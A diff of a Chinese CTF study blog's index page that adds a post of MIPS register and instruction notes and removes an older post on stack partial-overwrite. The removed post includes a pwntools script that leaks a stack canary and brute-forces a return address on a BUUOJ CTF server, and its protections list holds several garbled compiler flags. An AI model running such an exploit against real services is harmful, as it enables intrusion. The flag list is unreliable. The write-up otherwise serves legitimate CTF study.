@@ -147,6 +147,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/15/mips%E5%88%9D%E4%BD%93%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="rootzhang">
+      <meta itemprop="description" content="我的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="study">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/01/15/mips%E5%88%9D%E4%BD%93%E9%AA%8C/" class="post-title-link" itemprop="url">mips初体验</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-01-15 23:05:05 / 修改时间：23:05:28" itemprop="dateCreated datePublished" datetime="2022-01-15T23:05:05+08:00">2022-01-15</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="MIPS初接触"><a href="#MIPS初接触" class="headerlink" title="MIPS初接触"></a>MIPS初接触</h1><p>配环境配两个晚上了，我快死了，本来kali上面工具挺多的就在原先的kali上面配置，本来ida都配好了，下载buildroot的时候告诉我磁盘不足，好吧我又重开了一个kail磁盘搞了40g，还是下载到buildroot的时候环境路径一直搞不好，网上能试用的我都试了还是不行，我想着那好吧，环境变量配不好我每次编译的时候把那长长一串路径也写上就好了，结果在后面安装编译mips大端环境的时候他会检测mipsel-linux-gcc在不在环境路径里，人傻了，于是放弃了kali</p>
+<p>想着那在ubuntu上搞吧，本来就少个ubuntu20,就顺便安装了Ubuntu20搞这个，结果第一遍ubuntu20不小心简便安装了，导致无法切换中文，vm-tools也不能像往常一样安装上，于是卸载ubuntu20重新安装，好歹安上了，vm-tools的安装按钮是灰的，我还没安装你怎么就灰了啊🤢，上网找解决措施告诉我要换源，我都没法复制粘贴我咋换源，最后依稀记得设置里也可以换源，就在那换源成功了，最后安上vm-tools，开始新一轮环境配置，结果还是在sudo make这里卡住了，真的服了，怎么都搞不好，最后又放弃ubuntu20打算在ubuntu16上面搞了，哎，现在正在执行sudo make命令，还不成我就放弃去整arm的环境，这个方向不欢迎我我就换个方向😢</p>
+<p>一个下午加两个晚上，终于配的差不多了</p>
+<h1 id="MIPS汇编学习"><a href="#MIPS汇编学习" class="headerlink" title="MIPS汇编学习"></a>MIPS汇编学习</h1><p>寄存器</p>
+<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220115212533425.png" alt="image-20220115212533425"></p>
+<p>我太懒了直接放别人的说明</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">0:即<span class="variable">$zero</span>,该寄存器总是返回零，为0这个有用常数提供了一个简洁的编码形式。</span></span><br><span class="line">           move $t0,$t1</span><br><span class="line">       实际为</span><br><span class="line">           add $t0,$0,$t1</span><br><span class="line">       使用伪指令可以简化任务，汇编程序提供了比硬件更丰富的指令集。</span><br><span class="line"><span class="meta">$</span><span class="bash">1:即<span class="variable">$at</span>，该寄存器为汇编保留，由于I型指令的立即数字段只有16位，在加载大常数时，编译器或汇编程序需要</span></span><br><span class="line">       把大常数拆开，然后重新组合到寄存器里。比如加载一个32位立即数需要 lui（装入高位立即数）和addi两条</span><br><span class="line">       指令。像MIPS程序拆散和重装大常数由汇编程序来完成，汇编程序必需一个临时寄存器来重组大常数，这</span><br><span class="line">       也是为汇编 保留$at的原因之一。</span><br><span class="line"><span class="meta">$</span><span class="bash">2..<span class="variable">$3</span>:(<span class="variable">$v0</span>-<span class="variable">$v1</span>)用于子程序的非浮点结果或返回值，对于子程序如何传递参数及如何返回，MIPS范围有一套约</span></span><br><span class="line">       定，堆栈中少数几个位置处的内容装入CPU寄存器，其相应内存位置保留未做定义，当这两个寄存器不够存</span><br><span class="line">       放返回值时，编译器通过内存来完成。</span><br><span class="line"><span class="meta">$</span><span class="bash">4..<span class="variable">$7</span>:(<span class="variable">$a0</span>-<span class="variable">$a3</span>)用来传递前四个参数给子程序，不够的用堆栈。a0-a3和v0-v1以及ra一起来支持子程序／过程</span></span><br><span class="line">       调用，分别用以传递参数，返回结果和存放返回地址。当需要使用更多的寄存器时，就需要堆栈（stack)</span><br><span class="line">       了,MIPS编译器总是为参数在堆栈中留有空间以防有参数需要存储。</span><br><span class="line"><span class="meta">$</span><span class="bash">8..<span class="variable">$15</span>:(<span class="variable">$t0</span>-<span class="variable">$t7</span>)临时寄存器，子程序可以使用它们而不用保留。</span></span><br><span class="line"><span class="meta">$</span><span class="bash">16..<span class="variable">$23</span>:(<span class="variable">$s0</span>-<span class="variable">$s7</span>)保存寄存器，在过程调用过程中需要保留（被调用者保存和恢复，还包括<span class="variable">$fp</span>和<span class="variable">$ra</span>），MIPS</span></span><br><span class="line">       提供了临时寄存器和保存寄存器，这样就减少了寄存器溢出（spilling,即将不常用的变量放到存储器的过程),</span><br><span class="line">       编译器在编译一个叶（leaf)过程（不调用其它过程的过程）的时候，总是在临时寄存器分配完了才使用需要</span><br><span class="line">       保存的寄存器。</span><br><span class="line"><span class="meta">$</span><span class="bash">24..<span class="variable">$25</span>:(<span class="variable">$t8</span>-<span class="variable">$t9</span>)同(<span class="variable">$t0</span>-<span class="variable">$t7</span>)</span></span><br><span class="line"><span class="meta">$</span><span class="bash">26..<span class="variable">$27</span>:(<span class="variable">$k0</span>,<span class="variable">$k1</span>)为操作系统／异常处理保留，至少要预留一个。 异常（或中断）是一种不需要在程序中显示</span></span><br><span class="line">       调用的过程。MIPS有个叫异常程序计数器（exception program counter,EPC)的寄存器，属于CP0寄存器，</span><br><span class="line">       用于保存造成异常的那条指令的地址。查看控制寄存器的唯一方法是把它复制到通用寄存器里，指令mfc0</span><br><span class="line">       (move from system control)可以将EPC中的地址复制到某个通用寄存器中，通过跳转语句（jr)，程序可以返</span><br><span class="line">       回到造成异常的那条指令处继续执行。MIPS程序员都必须保留两个寄存器$k0和$k1，供操作系统使用。</span><br><span class="line"></span><br><span class="line">       发生异常时，这两个寄存器的值不会被恢复，编译器也不使用k0和k1,异常处理函数可以将返回地址放到这</span><br><span class="line">       两个中的任何一个，然后使用jr跳转到造成异常的指令处继续执行。</span><br><span class="line"><span class="meta">$</span><span class="bash">28:(<span class="variable">$gp</span>)为了简化静态数据的访问，MIPS软件保留了一个寄存器：全局指针gp(global pointer,<span class="variable">$gp</span>)，全局指针</span></span><br><span class="line">       只想静态数据区中的运行时决定的地址，在存取位于gp值上下32KB范围内的数据时，只需要一条以gp为基</span><br><span class="line">       指针的指令即可。在编译时，数据须在以gp为基指针的64KB范围内。</span><br><span class="line"><span class="meta">$</span><span class="bash">29:(<span class="variable">$sp</span>)MIPS硬件并不直接支持堆栈，你可以把它用于别的目的，但为了使用别人的程序或让别人使用你的程</span></span><br><span class="line">       序， 还是要遵守这个约定的，但这和硬件没有关系。</span><br><span class="line"><span class="meta">$</span><span class="bash">30:(<span class="variable">$fp</span>)GNU MIPS C编译器使用了帧指针(frame pointer),而SGI的C编译器没有使用，而把这个寄存器当作保</span></span><br><span class="line">       存寄存器使用（$s8),这节省了调用和返回开销，但增加了代码生成的复杂性。</span><br><span class="line"><span class="meta">$</span><span class="bash">31:(<span class="variable">$ra</span>)存放返回地址，MIPS有个jal(jump-and-link,跳转并 链接)指令，在跳转到某个地址时，把下一条指令的</span></span><br><span class="line">       地址放到$ra中。用于支持子程序，例如调用程序把参数放到$a0~$a3,然后jal X跳到X过程，被调过程完成后</span><br><span class="line">       把结果放到$v0,$v1,然后使用jr $ra返回。</span><br></pre></td></tr></table></figure>
+
+<p>先做个初步了解，做题时再慢慢熟悉</p>
+<h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>li：用于将最大16位立即数存入一个寄存器（后十六位）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li $Rb, 0x30</span><br></pre></td></tr></table></figure>
+
+<p>lui:读取一个十六位立即数放入寄存器的高16位，低十六位补0，要加载一个32位的立即数需要lui和add两条指令完成，因为mips一条指令是32位定长的，还得放指令，数据不可能直接占32位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lui $a1, 0x42</span><br></pre></td></tr></table></figure>
+
+<p>lw:用于从一个指定的地址加载到word类型的值到寄存器中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lw $s0, 0($sp)//取堆栈地址偏移0内存word长度的值到$s0中，$s0 = MEM[$sp+0]</span><br></pre></td></tr></table></figure>
+
+<p>sw:用于将源寄存器的值存入地指定的地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sw $a0, 0($sp) //将$a0寄存器中的一个word大小的值存入堆栈，且$sp自动抬栈</span><br></pre></td></tr></table></figure>
+
+<p>算数指令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.    add $t0, $t1, $t2 //$t0 = $t1 + $t2，带符号数相加</span><br><span class="line">2.    sub $t0, $t1, $t2 //$t0 = $t1 - $t2，带符号数相减</span><br><span class="line">3.    addi $t0, $t1, 5 //$t0 = $t1 + 5</span><br><span class="line">4.    addu $t0, $t1, $t2 //$t0 = $t1 + $t2，无符号数相加</span><br><span class="line">5.    subu $t0, $t1, $t2 //$t0 = $t1 - $t2，无符号数相减</span><br><span class="line">6.    mult $t3, $t4 //(Hi, Lo) = $t3 * $t4</span><br><span class="line">7.    div $t5, $t6 //$Lo = $t5 / $t6 $Lo为商的整数部分， $Hi为商的余数部分</span><br><span class="line">8.    mfhi $t0 //$t0 = $Hi</span><br><span class="line">9.    mflo $t1 //$t1 = $Lo</span><br></pre></td></tr></table></figure>
+
+<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><p>系统调用号放入￥v0中，参数存放在$a0~$a3中（参数过多的话有另一套机制来处理（？）），系统调用的返回值通常放在￥v0中，如果出错，就会在$a3中返回一个错误好，最终调用syscll指令</p>
+<h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>跳转指令：mips的指令长度是32位，操作码最少要占6位，剩下的26位用于跳转地址的储存，由于所有的指令在内存中都是32位对齐的，所以最后1个字节是没必要储存的，所以地址范围是2^28=256MB。</p>
+<p>分支跳转</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.    beq $Rs, $Rt, target //if ($Rs == $Rt): goto target</span><br><span class="line">2.    blt $Rs, $Rt, target //if ($Rs &lt; $Rt): goto target </span><br><span class="line">3.    ble $Rs, $Rt, target //if ($Rs &lt;= $Rt): goto target </span><br><span class="line">4.    bgt $Rs, $Rt, target //if ($Rs &gt; $Rt): goto target </span><br><span class="line">5.    bge $Rs, $Rt, target //if ($Rs &gt;= $Rt): goto target </span><br><span class="line">6.    bne $Rs, $Rt, target //if ($Rs != $Rt): goto target</span><br></pre></td></tr></table></figure>
+
+<p>直接跳转指令（别人总结的很好，直接贴上）</p>
+<p>j：该指令无条件跳转到一个绝对地址。实际上，j 指令跳转到的地址并不是直接指定32位的地址（所有 MIPS 指令都是 32 位长，不可能全部用于编址数据域，那样的指令是无效的，也许只有nop）：由于目的地址的最高4位无法在指令的编码中给出，32位地址的最高4位取值当前PC的最高4位。对于一般的程序而言，28位地址所支持的256MB跳转空间已经足够大了。要实现更远程的跳转，必须使用 jr 指令跳转到指定寄存器中，该指令也用于需要计算合成跳转目标地址的情形。你可以使用 j 助记符后面紧跟一个寄存器表示寄存器跳转，不过一般不推荐这么做。</p>
+<p>jal、jalr：这两条指令分别实现了直接和间接子程序调用。在跳转到指定地址实现子程序调用的同时，需要将返回地址（当前指令地址+8）保存到 ra（$31）寄存器中。为什么是当前指令地址加8呢？这是因为紧随跳转指令之后有一条立即执行的延迟槽指令（例如nop占位指令），加8刚好是延迟槽后面的那条有效指令。从子程序返回是通过寄存器跳转完成，通常调用 jr ra。</p>
+<p>基于 PC 相对寻址的位置无关子程序调用通过 bal、bgezal 和 bltzal 指令完成。条件分支和链接指令即使在条件为假的情况下，也会将它们的返回地址保存到 ra 中，这在需要基于当前指令地址做计算的场合非常有用。</p>
+<p>b：相对当前指令地址（PC）的无条件短距离跳转指令。</p>
+<p>bal：基于当前指令地址（PC）的函数调用指令。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/io-file%E4%B9%8Bstdout/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1065,84 +1158,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="rootzhang">
-      <meta itemprop="description" content="我的博客">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="study">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/11/06/%E6%A0%88%E6%9A%82%E6%97%B6%E5%B0%B1%E5%88%B0%E8%BF%99%E4%BA%86/" class="post-title-link" itemprop="url">栈暂时就到这了</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-06 15:51:04 / 修改时间：15:51:29" itemprop="dateCreated datePublished" datetime="2021-11-06T15:51:04+08:00">2021-11-06</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="栈上的Partial-Overwrite"><a href="#栈上的Partial-Overwrite" class="headerlink" title="栈上的Partial-Overwrite"></a>栈上的Partial-Overwrite</h2><p>原理：对于开了PIE保护的程序，每次的指令地址都是随机的，但是地址的最后十二位总是固定的，也就是ida对于的地址，我们只要修改最后十二位地址，就可以控制程序流程了，但是修改数据只能整字节修改，无法直接修改12位，所以一般都是直接修改两个字节，对于第十二位到第十六位就一个一个试，比如一个函数的地址是0x30a，我们想要程序跳到这里，可以这样构造/x0a/xy3,y属于0到f，一个一个试，总会对的。或者固定一个值，让程序连接多次，16分之一的概率。</p>
-<p>例题：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_960</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  buf[<span class="number">5</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">2</span>] = <span class="number">0LL</span>;</span><br><span class="line">  buf[<span class="number">3</span>] = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your Name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s:\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以看见这个程序还有canary保护，read函数碰到\0会停止读取，我们只要一直覆盖到canary处就可以了，不过要加1，因为canary最后一个字节是\x00，也得把他覆盖掉才行。</p>
-<p>最后payload</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29355</span>)</span><br><span class="line">        <span class="comment">#sh=process(&#x27;./babypie&#x27;)</span></span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;Input your Name:&#x27;</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>+<span class="number">1</span>))</span><br><span class="line">        canary=<span class="string">&#x27;\0&#x27;</span>+sh.recvn(<span class="number">7</span>)</span><br><span class="line">        sleep(<span class="number">0.3</span>)</span><br><span class="line">        sh.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+canary+<span class="string">&#x27;bbbbbbbb&#x27;</span>+<span class="string">&#x27;\x3e\x0a&#x27;</span>)</span><br><span class="line">        sh.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure>
-
-<p>循环的原因就是y不确定，所以假设为0,如果程序真为0就会控制成功，如果不成功就会再连接一次</p>
-<p>顺便来补一个程序保护</p>
-<h2 id="Pwn保护说明"><a href="#Pwn保护说明" class="headerlink" title="Pwn保护说明"></a>Pwn保护说明</h2><h3 id="1-Arch"><a href="#1-Arch" class="headerlink" title="1.Arch:"></a>1.Arch:</h3><p>说明程序的架构，位数，和是大端序还是小端序</p>
-<h3 id="2-RELR："><a href="#2-RELR：" class="headerlink" title="2.RELR："></a>2.RELR：</h3><p>设置符号重定位表为只读或者在程序启动时就解析所有动态符号，从二建扫对got表的攻击</p>
-<p>编译选项：关闭： -z morello  开启部分：-z lazy 开启全部：-z now</p>
-<h3 id="stack"><a href="#stack" class="headerlink" title="stack:"></a>stack:</h3><p>栈保护溢出</p>
-<p>编译选项：关闭：-fon-stack-protector 开启：-fstack_protector-all</p>
-<h3 id="NX"><a href="#NX" class="headerlink" title="NX:"></a>NX:</h3><p>堆栈不可执行</p>
-<p>编译选项：关闭-z execstack 开启：-z noexecstack</p>
-<h3 id="PIE："><a href="#PIE：" class="headerlink" title="PIE："></a>PIE：</h3><p>内存地址随机化（linux下pie启动必须同时开始aslr）</p>
-<p>编译选项：关闭 -no-pie 开启 -pie ifPIC</p>
-<h3 id="RWX"><a href="#RWX" class="headerlink" title="RWX:"></a>RWX:</h3><p>bss段可执行</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1212,7 +1227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-count">13</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
